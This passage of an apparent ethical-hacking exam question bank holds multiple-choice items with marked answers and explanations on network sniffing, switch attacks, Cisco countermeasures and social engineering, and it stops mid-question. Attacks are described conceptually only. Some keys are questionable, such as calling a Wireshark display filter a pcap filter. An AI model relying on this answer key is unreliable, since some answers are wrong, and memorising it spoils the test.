> Wireshark is a free and open-source packet analyzer. It is used for network troubleshooting, analysis, software and communications protocol development, and education.

281. What is the correct pcap filter to capture all transmission control protocol (TCP)traffic going to or from host 192.168.0.125 on port 25?
+ [x] `tcp.port == 25 and ip.addr == 192.168.0.125`
+ [ ] `port 25 and host 192.168.0.125`
+ [ ] `host 192.168.0.125:25`
+ [ ] `tcp.src == 25 and ip.host == 192.168.0.125`
> **Explanation:**
> Pcap filters display traffic on the target network by protocol type, IP address, port, etc. Display filters are used to change the view of packets in the captured files.
> 
> Some of the pcap filters include:
> + Monitoring the specific ports
> 	+ `tcp.port==23`
> 	+ `ip.addr==192.168.1.100 machine`
> 	+ `ip.addr==192.168.1.100 && tcp.port=23`
> + Filtering by Multiple IP Addresses
> 	+ `ip.addr == 10.0.0.4 or ip.addr == 10.0.0.5`
> + Filtering by IP Address
> 	+ `ip.addr == 10.0.0.4`
> + Filtering specific Port and IP Address
> 	+ `tcp.port == 23 and ip.addr == 192.168.1.100`
> 
> Hence, in the above scenario the pcap filter to capture all TCP traffic going to or from host 192.168.0.125 on port 25 is as given below:
> + `tcp.port == 25 and ip.addr == 192.168.0.125`

282. Which of the following technique involves sending no packets and just capturing and monitoring the packets flowing in the network?
+ [ ] Active sniffing
+ [ ] Port sniffing
+ [x] Passive sniffing
+ [ ] Network scanning
> **Explanation:**
> **Active sniffing:** Active sniffing searches for traffic on a switched LAN by actively injecting traffic into the LAN. Active sniffing also refers to sniffing through a switch. In active sniffing, the switched Ethernet does not transmit information to all the systems connected through LAN as it does in a hub-based network.
> 
> **Passive Sniffing:** Passive sniffing involves sending no packets. It just captures and monitors the packets flowing in the network. A packet sniffer alone is not preferred for an attack because this works only in a common collision domain. A common collision domain is the sector of the network that is not switched or bridged (i.e., connected through a hub).
> 
> **Port Scanning:** Lists the open ports and services. Port scanning is the process of checking the services running on the target computer by sending a sequence of messages in an attempt to break in. Port scanning involves connecting to or probing TCP and UDP ports on the target system to determine if the services are running or are in a listening state.
> 
> **Network Scanning:** – Lists IP addresses. Network scanning is a procedure for identifying active hosts on a network, either to attack them or to assess the security of the network.

283. Out of the following, which is not an active sniffing technique?
+ [ ] MAC flooding
+ [x] Domain snipping
+ [ ] Spoofing attack
+ [ ] Switch port stealing
> **Explanation:**
> MAC flooding, spoofing attack, and switch port stealing are active sniffing techniques, whereas domain snipping is a type of domain name system (DNS) attack.

284. Out of the following, which layer is responsible for encoding and decoding data packets into bits?
+ [ ] Application layer
+ [ ] Network layer
+ [ ] Session layer
+ [x] Data Link layer
> **Explanation:**
> **Application Layer:** The Application layer consists of the protocols used by the applications. These applications provide user services and data over the network connections recognized by the lower layer protocols.
> 
> **Session Layer:** Session layer is responsible for establishing and maintaining sessions between the source and destination systems.
> 
> **Data link layer:** The Data Link layer is the second layer of the OSI model. In this layer, data packets are encoded and decoded into bits often called frames. Sniffers operate at the Data Link layer and can capture the packets from the Data Link layer.
> 
> **Network Layer:** The Network layer is responsible for transmitting data from source system to the destination system using various routing protocols.

285. An attacker wants to monitor a target network traffic on one or more ports on the switch. In such a case, which of the following methods can he use?
+ [ ] Active sniffing
+ [x] Port mirroring
+ [ ] Lawful interception
+ [ ] Wiretapping
> **Explanation:**
> Switched port analyzer (SPAN) is a Cisco switch feature, also known as “port mirroring,” that monitors network traffic on one or more ports on the switch. It is a port that is configured to receive a copy of every packet that passes through a switch. It helps to analyze and debug data, identify errors, and investigate unauthorized network access on a network.

286. Which of the following protocols is not vulnerable to sniffing?
+ [x] Secure Sockets Layer (SSL)
+ [ ] Telnet and Rlogin
+ [ ] Hyper Text Transfer Protocol (HTTP)
+ [ ] Post Office Protocol (POP)
> **Explanation:**
> SSL is used to secure connections between network application clients and servers over an insecure network, such as the Internet.
> 
> SSL uses a combination of public key and symmetric key encryption to secure a connection between two machines, typically a web or mail server and a client system, communicating over the Internet or another TCP/IP network. SSL provides a mechanism to encrypt and authenticate data sent between processes running on a client and server.

287. Sniffers work at which of the following open systems interconnect (OSI) layers?
+ [x] Data link layer
+ [ ] Transport layer
+ [ ] Presentation layer
+ [ ] Application layer
> **Explanation:**
> In data link layer, data packets are encoded and decoded into bits. Sniffers operate at the data link layer and can capture the packets from the data link layer.


## Sniffing Techniques and Tools
288. An attacker is sending spoofed router advertisement messages so that all the data packets travel through his system. Then the attacker is trying to sniff the traffic to collect valuable information from the data packets to launch further attacks such as man-in-the-middle, denial-of-service, and passive sniffing attacks on the target network.
Which of the following technique is the attacker using in the above scenario?
+ [x] IRDP Spoofing
+ [ ] MAC Flooding
+ [ ] DHCP Starvation Attack
+ [ ] ARP Spoofing
> **Explanation:**
> **IRDP Spoofing:** The IRDP Router Discovery Protocol (IRDP) is a routing protocol that allows a host to discover the IP addresses of active routers on its subnet by listening to router advertisement and solicitation messages on its network. An attacker can use this to send spoofed router advertisement messages so that all the data packets travel through the attacker's system. Thus, the attacker can sniff the traffic and collect valuable information from the data packets. Attackers can use IRDP spoofing to launch MITM, DoS, and passive sniffing attacks.
> + **Passive Sniffing:** In a switched network, the attacker spoofs IRDP traffic to re-route the outbound traffic of target hosts through the attacker’s machine.
> + **MITM:** Once sniffing starts, the attacker acts as a proxy between the victim and destination. The attacker plays an MITM role and tries to modify the traffic.
> + **DoS:** IDRP spoofing allows remote attackers to add wrong route entries into victims routing table. The wrong address entry causes DoS.
> 
> **DHCP Starvation Attack:** In a DHCP starvation attack, an attacker floods the DHCP server by sending a large number of DHCP requests and uses all of the available IP addresses that the DHCP server can issue. As a result, the server cannot issue any more IP addresses, leading to Denial-of-Service (DoS) attacks.
> 
> **MAC Flooding:** MAC flooding is a technique used to compromise the security of network switches that connect network segments or network devices. Attackers use the MAC flooding technique to force a switch to act as a hub, so that they can easily sniff the traffic.
> 
> **ARP Spoofing:** ARP Spoofing involves constructing a large number of forged ARP request and reply packets to overload a switch. Attackers use this flaw in ARP to create malformed ARP replies containing spoofed IP and MAC addresses. Assuming it to be the legitimate ARP reply, the victim's computer blindly accepts the ARP entry into its ARP table. Once the ARP table is flooded with spoofed ARP replies, the attacker sets the switch in forwarding mode, which intercepts all the data that flows from the victim machine without the victim being aware of the attack.

289. Which of the following DNS poisoning techniques uses ARP poisoning against switches to manipulate routing table?
+ [ ] Proxy Server DNS Poisoning
+ [ ] Internet DNS Spoofing
+ [ ] DNS Cache Poisoning
+ [x] Intranet DNS Spoofing
> **Explanation:**
> DNS poisoning techniques to sniff the DNS traffic of a target network. Using this technique, an attacker can obtain the ID of the DNS request by sniffing and can send a malicious reply to the sender before the actual DNS server.
> 
> DNS poisoning is possible using the following techniques:  
> + Intranet DNS spoofing  
> + Internet DNS spoofing  
> + Proxy server DNS poisoning  
> + DNS cache poisoning
> 
> **Intranet DNS spoofing:** An attacker can perform an intranet DNS spoofing attack on a switched LAN with the help of the ARP poisoning technique. To perform this attack, the attacker must be connected to the LAN and be able to sniff the traffic or packets. An attacker who succeeds in sniffing the ID of the DNS request from the intranet can send a malicious reply to the sender before the actual DNS server.
> 
> **Internet DNS spoofing:** Attackers perform Internet DNS spoofing with the help of Trojans when the victim’s system connects to the Internet. It is an MITM attack in which the attacker changes the primary DNS entries of the victim’s computer.
> 
> **Proxy server DNS poisoning:** In the proxy server DNS poisoning technique, the attacker sets up a proxy server on the attacker’s system. The attacker also configures a fraudulent DNS and makes its IP address a primary DNS entry in the proxy server.
> 
> **DNS cache poisoning:** Attackers target this DNS cache and make changes or add entries to the DNS cache. If the DNS resolver cannot validate that the DNS responses have come from an authoritative source, it will cache the incorrect entries locally and serve them to users who make the same request.

290. Which tool would be used to collect wireless packet data?
+ [ ] Netcat
+ [ ] John the Ripper
+ [ ] Nessus
+ [x] NetStumbler
> **Explanation:**
> **NetStumbler:** It is a tool used for collecting wireless packets and detecting wireless LANs using 802.11b, 802.11a and 802.11g WLAN standards. It runs on Windows environment.
> 
> **John The Ripper:** John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords. Besides several crypt(3) password hash types most commonly found on various Unix systems, supported out of the box are Windows LM hashes, plus lots of other hashes and ciphers in the community-enhanced version.
> 
> **Nessus:** Nessus Professional is an assessment solution for identifying vulnerabilities, configuration issues, and malware that attackers use to penetrate networks. It performs vulnerability, configuration, and compliance assessment. It supports various technologies such as operating systems, network devices, hypervisors, databases, tablets/phones, web servers and critical infrastructure.
> 
> **Netcat:** Netcat is a networking utility that reads and writes data across network connections, using the TCP/IP protocol. It is a reliable “back-end” tool used directly or driven by other programs and scripts. It is also a network debugging and exploration tool.

291. A corporation hired an ethical hacker to test if it is possible to obtain users’ login credentials using methods other than social engineering. The ethical hacker is working on Windows system and trying to obtain login credentials. He decided to sniff and capture network traffic using an automated tool and use the same tool to crack the passwords of users.
Which of the following techniques can be employed by the ethical hacker?
+ [ ] Capture every users' traffic with Ettercap.
+ [ ] Capture LANMAN Hashes and crack them with L0phtCrack.
+ [ ] Guess passwords using Medusa or Hydra against a network service.
+ [x] Capture administrators’ RDP traffic and decode it with Cain and Abel.
> **Explanation:**
> **Ettercap:** Ettercap is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.
> 
> **L0phtCrack:** L0phtCrack is a tool designed to audit password and recover applications. It recovers lost Microsoft Windows passwords with the help of dictionary, hybrid, rainbow table, and brute-force attacks, and it also checks the strength of the password. LOphtCrack helps to disclose the security defects that are inherent in windows password authentication system.
> 
> **Medusa:** Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. The goal is to support as many services which allow remote authentication as possible.
> 
> **Cain And Abel:** Cain & Abel is a password recovery tool for Microsoft Operating Systems. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols.

292. A hacker, who posed as a heating and air conditioning specialist, was able to install a sniffer program in a switched environment network. Which attack could have been used by the hacker to sniff all of the packets in the network?
+ [ ] Smurf attack
+ [ ] Tear drop attack
+ [ ] Fraggle attack
+ [x] MAC flood attack
> **Explanation:**
> To sniff all the packets in a network, the attacker can flood the switch with many Ethernet frames, each containing different source MAC addresses. Check whether the switch enters into fail open mode, in which the switch broadcasts data to all ports rather than just to the port intended to receive the data. If this happens, then attackers have the ability to sniff network traffic.

293. Pentest results indicate that voice over IP traffic is traversing a network. Which of the following tools will decode a packet capture and extract the voice conversations?
+ [ ] John the Ripper
+ [ ] Nikto
+ [x] Cain and Abel
+ [ ] Hping
> **Explanation:**
> **Cain and Abel:** Cain & Abel is a password recovery tool for Microsoft Operating Systems. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding scrambled passwords, recovering wireless network keys, revealing password boxes, uncovering cached passwords and analyzing routing protocols.
> 
> **John the Ripper:** John the Ripper is a fast password cracker, currently available for many flavors of Unix, Windows, DOS, and OpenVMS. Its primary purpose is to detect weak Unix passwords. Besides several crypt(3) password hash types most commonly found on various Unix systems, supported out of the box are Windows LM hashes, plus lots of other hashes and ciphers in the community-enhanced version.
> 
> **Nikto:** Nikto is a vulnerability scanner that is used extensively to identify potential vulnerabilities in web applications and web servers.
> 
> **Hping:** Hping2/Hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols. It performs network security auditing, firewall testing, manual path MTU discovery, advanced traceroute, remote OS fingerprinting, remote uptime guessing, TCP/IP stacks auditing, and other functions.

294. Which technical characteristic do Ethereal/Wireshark, TCPDump, and Snort have in common?
+ [ ] They send alerts to security monitors.
+ [ ] They use the same packet analysis engine.
+ [ ] They are written in Java.
+ [x] They use the same packet capture utility.
> **Explanation:**
> Snort is an open source network intrusion detection system, capable of performing real time traffic analysis and packet logging on IP networks. It can perform protocol analysis and content searching/matching and is used to detect a variety of attacks and probes, such as buffer overflows, stealth port scans, CGI attacks, SMB probes, and OS fingerprinting attempts. It uses a flexible rules language to describe traffic that it should collect or pass, as well as a detection engine that utilizes a modular plug-in architecture.
> 
> Uses of Snort:
> + Straight packet sniffer like tcpdump, Wireshark
> + Packet logger (useful for network traffic debugging, etc.)
> + Network intrusion prevention system

295. What is the length of ID number of an organization in a MAC address?
+ [ ] 26 bits
+ [ ] 12 bits
+ [x] 24 bits
+ [ ] 48 bits
> **Explanation:**
> A MAC address is 48 bits, which splits into two sections, each containing 24 bits. The first section contains the ID number of the organization that manufactured the adapter and is called the organizationally unique identifier. The next section contains the serial number assigned to the NIC adapter and is called the network interface controller (NIC) specific.

296. What happens when a switch CAM table becomes full?
+ [x] The switch then acts as a hub by broadcasting packets to all machines on the network.
+ [ ] The switch replaces outgoing frame switch factory default MAC address of FF:FF:FF:FF:FF:FF.
+ [ ] The CAM overflow table will cause the switch to crash causing denial-of-service (DoS).
+ [ ] Every packet is dropped and the switch sends out simple network management protocol (SNMP) alerts to the intrusion detection system (IDS) port.
> **Explanation:**
> The CAM table contains network information such as MAC addresses available on physical switch ports and associated virtual local area network (VLAN) parameters. The CAM table’s limited size renders it susceptible to attacks from MAC flooding. MAC flooding bombards the switch with fake source MAC addresses until the CAM table is full. Hereafter, the switch broadcasts all incoming traffic to all ports. This changes the behavior of the switch that then works like a hub through which you (the attacker) monitor the frames sent from the victim’s host to another host without any CAM table entry.

297. What method should be incorporated by a network administrator to prevent the organization’s network against ARP poisoning?
+ [ ] Resolve all DNS queries to local DNS server
+ [ ] Use SSL for secure traffic
+ [ ] Use secure shell (SSH) encryption
+ [x] Implement dynamic arp inspection (DAI) using the dynamic host configuration protocol (DHCP) snooping binding table
> **Explanation:**
> Implementation of DAI prevents poisoning attacks. DAI is a security feature that validates ARP packets in a network. When DAI activates on a VLAN, all ports on the VLAN are considered to be untrusted by default. DAI validates the ARP packets using a DHCP snooping binding table. The DHCP snooping binding table consists of MAC addresses, IP addresses, and VLAN interfaces acquired by listening to DHCP message exchanges. Hence, you must enable DHCP snooping before enabling DAI. Otherwise, establishing a connection between VLAN devices based on ARP is not possible. Consequently, a self-imposed DoS attack might result on any device in that VLAN.


## Sniffing Countermeasures
298. A tester wants to securely encrypt the session to prevent the network against sniffing attack, which of the following protocols should he use as a replacement of Telnet?
+ [ ] Load Balancing (LB)
+ [ ] Intrusion Prevention System (IPS)
+ [x] SSH
+ [ ] Public Key Infrastructure (PKI)
> **Explanation:**
> SSH is a network protocol used to remotely access and manage a device. The key difference between Telnet and SSH is that SSH uses encryption, which means that all data transmitted over a network is secure from eavesdropping. On a remote device, an SSH server must be installed and running.

299. Which of the following tool a tester can use to detect a system that runs in promiscuous mode, which in turns helps to detect sniffers installed on the network?
+ [ ] shARP
+ [ ] FaceNiff
+ [x] Nmap
+ [ ] OmniPeek
> **Explanation:**
> **Nmap:** There are many tools, such as the Nmap that are available to use for the detection of promiscuous mode. Nmap’s NSE script allows you to check if a target on a local Ethernet has its network card in promiscuous mode. There is an NSE script for nmap called sniffer-detect.nse which does just that. NAST: - it detects other PC's in promiscuous mode by doing the ARP test.
> 
> **FaceNiff:** FaceNiff is an Android app that can sniff and intercept web session profiles over the WiFi connected to the mobile. This app works on rooted android devices. The Wi-Fi connection should be over Open, WEP, WPA-PSK, or WPA2-PSK networks while sniffing the sessions.
> 
> **OmniPeek:** OmniPeek network analyzer provides real-time visibility and expert analysis of each part of the target network. This tool will analyze, drill down, and fix performance bottlenecks across multiple network segments. Attackers can use this tool to analyze a network and inspect the packets in the network.
> 
> **shARP:** An anti-ARP-spoofing application software that use active and passive scanning methods to detect and remove any ARP-spoofer from the network.

300. Which of the following command is used to set the maximum number of secure MAC addresses for the interface on a Cisco switch?
+ [x] switchport port-security maximum 1 vlan access
+ [ ] snmp-server enable traps port-security trap-rate 5
+ [ ] switchport port-security violation restrict
+ [ ] switchport port-security aging time 2
> **Explanation:**
> Configuring Port Security on Cisco switch: You can use the following Cisco port security feature to defend against MAC attacks:
> + switchport port-security
> Enables port security on the interface.
> 
> + switchport port-security maximum 1 vlan access
> Sets the maximum number of secure MAC addresses for the interface. The range is 1 to 3072. The default is 1.
> 
> + switchport port-security violation restrict
> Sets the violation mode, the action to be taken when a security violation {restrict | shutdown} is detected.
> 
> + switchport port-security aging time 2
> Sets the aging time for the secure port.
> 
> + switchport port-security aging type inactivity
> The type keyword sets the aging type as absolute or inactive.
> 
> + snmp-server enable traps port-security trap-rate 5
> Controls the rate at which SNMP traps are generated.

301. A network administrator wants to configure port security on a Cisco switch. Which of the following command helps the administrator to enable port security on an interface?
+ [ ] switchport port-security maximum 1
+ [ ] switchport port-security aging type inactivity
+ [x] switchport port-security
+ [ ] switchport port-security aging time 2
> **Explanation:**
> Configuring Port Security on Cisco switch: You can use the following Cisco port security feature to defend against MAC attacks:
> + switchport port-security
> Enables port security on the interface.
> 
> + switchport port-security maximum 1 vlan access
> Sets the maximum number of secure MAC addresses for the interface. The range is 1 to 3072. The default is 1.
> 
> + switchport port-security violation restrict
> Sets the violation mode, the action to be taken when a security violation {restrict | shutdown} is detected.
> 
> + switchport port-security aging time 2
> Sets the aging time for the secure port.
> 
> + switchport port-security aging type inactivity
> The type keyword sets the aging type as absolute or inactive.
> 
> + snmp-server enable traps port-security trap-rate 5
> Controls the rate at which SNMP traps are generated.

302. Out of the following options, identify the function of the following command performed on a Cisco switch.  
“switchport port-security mac-address sticky”
+ [ ] Configures the secure MAC address aging time on the port
+ [x] Adds all secure MAC addresses that are dynamically learned to the running configuration
+ [ ] Configures the maximum number of secure MAC addresses for the port
+ [ ] Configures the switch port parameters to enable port security
> **Explanation:**
> Configuring Port Security on Cisco switch: You can use the following Cisco port security feature to defend against MAC attacks:
> + switchport port-security
> Enables port security on the interface.
> 
> + switchport port-security maximum 1 vlan access
> Sets the maximum number of secure MAC addresses for the interface. The range is 1 to 3072. The default is 1.
>
> + switchport port-security violation restrict
> Sets the violation mode, the action to be taken when a security violation {restrict | shutdown} is detected.
> 
> + switchport port-security aging time 2
> Sets the aging time for the secure port.
> 
> + switchport port-security aging type inactivity
> The type keyword sets the aging type as absolute or inactive.
> 
> + snmp-server enable traps port-security trap-rate 5
> Controls the rate at which SNMP traps are generated.
> 
> + switchport port-security mac-address sticky
> Enables sticky learning on the interface by entering only the mac-address sticky keywords. When sticky learning is enabled, the interface adds all secure MAC addresses that are dynamically learned to the running configuration and converts these addresses to sticky secure MAC addresses.

303. Which of the following is a defense technique for MAC spoofing used in switches that restricts the IP traffic on untrusted Layer 2 ports by filtering traffic based on the DHCP snooping binding database?
+ [x] IP Source Guard
+ [ ] DHCP snooping binding table
+ [ ] Dynamic ARP inspection
+ [ ] Authentication, authorization, and accounting (AAA)
> **Explanation:**
> Following some of the techniques to defend against MAC address spoofing attacks:
> + **IP Source Guard:** IP Source Guard is a security feature in switches that restricts the IP traffic on untrusted Layer 2 ports by filtering traffic based on the DHCP snooping binding database. It prevents spoofing attacks when the attacker tries to spoof or use the IP address of another host.
> + **DHCP Snooping Binding Table:** The DHCP snooping process filters untrusted DHCP messages and helps to build and bind a DHCP binding table. This table contains the MAC address, IP address, lease time, binding type, VLAN number, and interface information to correspond with untrusted interfaces of a switch. It acts as a firewall between untrusted hosts and DHCP servers. It also helps in differentiating between trusted and untrusted interfaces.
> + **Dynamic ARP Inspection:** The system checks the IP to MAC address binding for each ARP packet in a network. While performing a Dynamic ARP inspection, the system will automatically drop invalid IP to MAC address bindings.
> + **AAA (Authentication, Authorization and Accounting):** Use of AAA (Authentication, Authorization and Accounting) server mechanism in order to filter MAC addresses subsequently.

304. Which of the following is a type of network protocol for port-based network access control (PNAC)?
+ [ ] SSL
+ [x] IEEE 802.1X suites
+ [ ] SFTP
+ [ ] SSH
> **Explanation:**
> It is a type of network protocol for PNAC, and its main purpose is to enforce access control at the point where a user joins the network. It is part of the IEEE 802.1 group of networking protocols. It provides an authentication mechanism to devices wishing to attach to a LAN or WLAN.

305. An ethical hacker is performing penetration testing on the target organization. He decided to test the organization’s network to identify the systems running in promiscuous mode. Identify the tool that the ethical hacker needs to employ?
+ [ ] FOCA
+ [ ] FaceNiff
+ [ ] Recon-ng
+ [x] Nmap
> **Explanation:**
> **FaceNiff:** FaceNiff is an Android app that can sniff and intercept web session profiles over the WiFi connected to the mobile. This app works on rooted android devices. The Wi-Fi connection should be over Open, WEP, WPA-PSK, or WPA2-PSK networks while sniffing the sessions.
> 
> **FOCA:** FOCA (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans. It is capable of scanning and analyzing a wide variety of documents, with the most common being Microsoft Office, Open Office, or PDF files
> 
> **Nmap:** Nmap’s NSE script allows you to check if a target on a local Ethernet has its network card in promiscuous mode.
> Command to detect NIC in promiscuous mode:
> + `nmap --script=sniffer-detect [Target IP Address/Range of IP addresses]`
> 
> **Recon-ng:** It is a Web Reconnaissance framework with independent modules, database interaction, built in convenience functions, interactive help, and command completion, that provides an environment in which open source web-based reconnaissance can be conducted.

306. Which of the following is not a mitigation technique against MAC address spoofing?
+ [ ] Dynamic ARP Inspection
+ [ ] IP Source Guard
+ [ ] DHCP Snooping Binding Table
+ [x] DNS Security (DNSSEC)
> **Explanation:**
> Following some of the techniques to defend against MAC address spoofing attacks:
> + **IP Source Guard:** IP Source Guard is a security feature in switches that restricts the IP traffic on untrusted Layer 2 ports by filtering traffic based on the DHCP snooping binding database. It prevents spoofing attacks when the attacker tries to spoof or use the IP address of another host.
> + **DHCP Snooping Binding Table:** The DHCP snooping process filters untrusted DHCP messages and helps to build and bind a DHCP binding table. This table contains the MAC address, IP address, lease time, binding type, VLAN number, and interface information to correspond with untrusted interfaces of a switch. It acts as a firewall between untrusted hosts and DHCP servers. It also helps in differentiating between trusted and untrusted interfaces.
> + **Dynamic ARP Inspection:** The system checks the IP to MAC address binding for each ARP packet in a network. While performing a Dynamic ARP inspection, the system will automatically drop invalid IP to MAC address bindings.
> + **DNS Security (DNSSEC):** Implement Domain Name System Security Extension (DNSSEC) to prevent DNS spoofing attacks.

307. Which of the following Cisco IOS global commands is used to enable or disable DHCP snooping on one or more VLANs?
+ [ ] no ip dhcp snooping information option
+ [ ] ip dhcp snooping
+ [x] ip dhcp snooping vlan 4,104
+ [ ] switchport port-security mac-address sticky
> **Explanation:**
> Cisco OS Global Commands:
> + ip dhcp snooping vlan 4,104
> Enable or disable DHCP snooping on one or more VLANs.
> 
> + no ip dhcp snooping information option
> To disable the insertion and the removal of the option-82 field, use the no IP dhcp snooping information option in global configuration command. To configure an aggregation, switch to drop incoming DHCP snooping packets with option-82 information from an edge switch, use the no IP dhcp snooping information option allow-untrusted global configuration command.
> 
> + ip dhcp snooping
    Enable DHCP snooping option globally.
> 
> Configuring Port Security on Cisco switch:
> + switchport port-security mac-address sticky
> Enables sticky learning on the interface by entering only the mac-address sticky keywords. When sticky learning is enabled, the interface adds all secure MAC addresses that are dynamically learned to the running configuration and converts these addresses to sticky secure MAC addresses.

# Social Engineering
## Social Engineering Concepts and Techniques
308. A security consultant decides to scrutinize the information by categorizing information as top secret, proprietary, for internal use only, for public use, etc. Which of the following attack can be mitigated using such countermeasure?
+ [x] Social engineering attack
+ [ ] Address Resolution Protocol (ARP) spoofing attack
+ [ ] Forensic attack
+ [ ] Scanning attack
> **Explanation:**
> Some of the countermeasures against social engineering are as follows:
> + **Train Individuals on Security Policies:** An efficient training program should consist of basic social engineering concepts and techniques, all security policies and methods to increase awareness about social engineering.
> + **Implement Proper Access Privileges:** There should be an administrator, user, and guest accounts with proper authorization.
> + **Presence of Proper Incidence Response Time:** There should be proper guidelines for reacting in case of a social engineering attempt.
> + **Availability of Resources Only to Authorized Users:** Make sure sensitive information is secured and resources are accessed only by authorized users
> + **Scrutinize Information:** Categorize the information as top secret, proprietary, for internal use only, for public use, etc.
> + **Background Check and Proper Termination Process:** Insiders with a criminal background and terminated employees are easy targets for procuring information.
> + **Anti-Virus/Anti-Phishing Defenses:** Use multiple layers of anti-virus defenses at end-user and mail gateway levels to minimize social engineering attacks.

309. Which of the following attacks can be prevented by implementing token or biometric authentication as a defense strategy?
+ [x] Impersonation
+ [ ] Eavesdropping
+ [ ] Shoulder surfing
+ [ ] Fake SMS
> **Explanation:**
> **Common Social Engineering Targets and Defense Strategies:**
> The table below shows common social engineering targets, various social engineering techniques an attacker uses, and the defense strategies to counter these attacks.
> | **Social Engineering Targets** | **Attack Techniques** | **Defense Strategies** |
> |--|--|--|
> | Front office and help desk | Eavesdropping, shoulder surfing, impersonation, persuasion, and intimidation | Train employees/help desk never to reveal passwords or other information by phone. Enforce policies for the front office and help desk personnel |
> | Technical support and System administrators | Impersonation, persuasion, intimidation, fake SMS, phone calls, and emails | Train technical support executives and system administrators never to reveal passwords or other information by phone or email |
> | Perimeter security | Impersonation, reverse social engineering, piggybacking, tailgating, etc. | Implement strict badge, token or biometric authentication, employee training, and security guards |
> | Office | Shoulder surfing, eavesdropping, ingratiation, etc. | Employee training, best practices and checklists for using passwords. Escort all guests. |
> | Vendors of the target organization | Impersonation, persuasion, intimidation | Educate vendors about social engineering. |
> | Mail room | Theft, damage or forging of mails | Lock and monitor mail room, including employee training |
> | Machine room/Phone closet | Attempting to gain access, remove equipment, and/or attach a protocol analyzer to grab the confidential data | Keep phone closets, server rooms, etc. locked at all times and keep updated inventory on equipment |
> | Company’s Executives | Fake SMS, phone calls and emails to grab confidential data | Train executives to never reveal identity, passwords or other confidential information by phone or email |
> | Dumpsters | Dumpster diving | Keep all trash in secured, monitored areas, shred important data, erase magnetic media |

310. Jack a malicious hacker wants to break into Brown Co.’s computers and obtain their secret information related to Company’s quotations. Jack calls Jane, an accountant at Brown Co., pretending to be an administrator from Brown Co. Jack tells Jane that there has been a problem with some accounts and asks her to verify her password with him “just to double check our records.” Jane does not suspect anything amiss, and reveals her password. Jack can now access Brown Co.’s computers with a valid username and password, to steal the confidential company’s quotations.
Identify the attack performed by Jack?
+ [ ] Reverse Engineering
+ [ ] Scanning
+ [x] Social Engineering
+ [ ] Footprinting
> **Explanation:**
> **Footprining:** Refers to the process of collecting information about a target network and its environment. Using footprinting, you can find a number of opportunities to penetrate and assess the target organization’s network.
> 
> **Reverse Engineering:** Malware analysis is a process of reverse engineering a specific piece of malware to determine the origin, functionality, and potential impact of a given type of malware.
> 
> **Social Engineering:** Social engineering is an art of manipulating people to divulge sensitive information to perform some malicious action. Despite security policies, attackers can compromise organization’s sensitive information using social engineering as it targets the weakness of people. Most often, employees are not even aware of a security lapse on their part and reveal organization’s critical information inadvertently. For instance, unwittingly answering the questions of strangers and replying to spam email.
> 
> **Scanning:** Scanning is the process of gathering additional detailed information about the target by using highly complex and aggressive reconnaissance techniques. Network scanning refers to a set of procedures used for identifying hosts, ports, and services in a network.

311. Jean Power wants to try and locate passwords from company XYZ. He waits until nightfall and climbs into the paper recycling dumpster behind XYZ, searching for information. What is Jean doing?
+ [ ] Password finding
+ [ ] Social engineering
+ [ ] Paper tracking
+ [x] Dumpster diving
> **Explanation:**
> Dumpster diving is a process of going into any dumpster of a facility to retrieve information.

312. Bad Pete would like to locally log onto a PC located inside a secure facility. He dresses like a delivery driver and holds a package outside of the secure facility and waits for someone to open the door. Once he gains entry, he finds an empty office with a PC and gains entry to the network. What is this type of activity known as?
+ [ ] Personal attack
+ [ ] Open door policy attack
+ [ ] Social equity attack
+ [x] Social engineering
> **Explanation:**
> Social engineering is correct. Known as a confidence trick or “con job,” social engineering is an act of manipulating humans.

313. Jacob Hacker wants to infect the network of a competitor with a worm virus. He sets the worm to autoexecute and loads 50 copies of the worm onto 50 separate USB drives. He drives to the competitor’s campus and drops the USB keys at various locations around the campus. He waits for random employees to pick it up and who might check to see what is on them by plugging them into their computer. Once an employee has inserted the key, the worm autoexecutes and the network is infected. What type of attack is described here?
+ [x] Social engineering
+ [ ] Distributed Denial-of-Service (DDoS) attack
+ [ ] Brute force attack
+ [ ] Virus attack
> **Explanation:**
> Social engineering is correct. Even though a worm is used as the final attack, human manipulation is used to get the competitor’s employees to insert the USB keys. People are curious and this attack takes advantage of that. The other answers are distractors with DDoS being a pure network attack and brute force being a password cracking hack.

314. Jose sends a link to the employee of a target organization, falsely claiming to be from a legitimate site in an attempt to acquire his account information. Identify the attack performed by Jose?
+ [ ] Eavesdropping
+ [ ] Vishing
+ [ ] Impersonation
+ [x] Phishing
> **Explanation:**
> **Phishing:** Phishing is a technique in which an attacker sends an email or provides a link falsely claiming to be from a legitimate site in an attempt to acquire a user’s personal or account information. The attacker registers a fake domain name, builds a lookalike website, and then mails the fake website’s link to several users. When a user clicks on the email link, it redirects him/her to the fake webpage, where he/she is lured to share sensitive details such as address and credit card information without knowing that it is a phishing site.
> 
> **Impersonation:** Impersonation is a common human-based social engineering technique where an attacker pretends to be a legitimate or authorized person. Attackers perform impersonation attacks personally or use the phone or other communication medium to mislead target and trick them into revealing information.
> 
> **Vishing:** Vishing (voice or VoIP phishing) is an impersonation technique in which attacker uses Voice over IP (VoIP) technology to trick individuals into revealing their critical financial and personal information and uses the information for his/her financial gain.
> 
> **Eavesdropping:** Eavesdropping refers to an unauthorized person listening to a conversation or reading others’ messages. It includes interception of any form of communication, including audio, video, or written, using channels such as telephone lines, email, and instant messaging.

315. What is the correct order of phases of social engineering attack?
+ [ ] Selecting target → research on target company → develop the relationship → exploit the relationship
+ [ ] Selecting target → develop the relationship → research on target company → exploit the relationship
+ [ ] Develop the relationship → research on target company → selecting target → exploit the relationship
+ [x] Research on target company → selecting target → develop the relationship → exploit the relationship
> **Explanation:**
> Attackers follow the following steps given to execute a successful social engineering attack:  
